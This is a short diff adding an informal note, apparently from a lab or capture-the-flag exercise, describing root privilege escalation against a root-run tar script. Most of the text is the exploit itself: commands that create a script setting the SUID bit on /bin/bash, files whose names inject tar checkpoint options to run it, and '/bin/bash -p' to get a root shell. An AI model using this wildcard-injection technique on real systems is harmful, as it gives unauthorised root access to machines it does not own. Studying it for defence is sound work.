@@ -1,0 +1,19 @@
+
+
+was a script running as root that was getting all files from the "user" directory so when I ran this
+
+add to directory getting tar and run by root 
+
+        printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
+        echo "" > "--checkpoint-action=exec=sh shell.sh"
+        echo "" > --checkpoint=1
+
+it added to the directory and when the root ran the script again I was able to run 
+
+run in terminal after files below have been exicuted
+
+	/bin/bash -p
+
+and then gain root privaleges ************************************
+
+
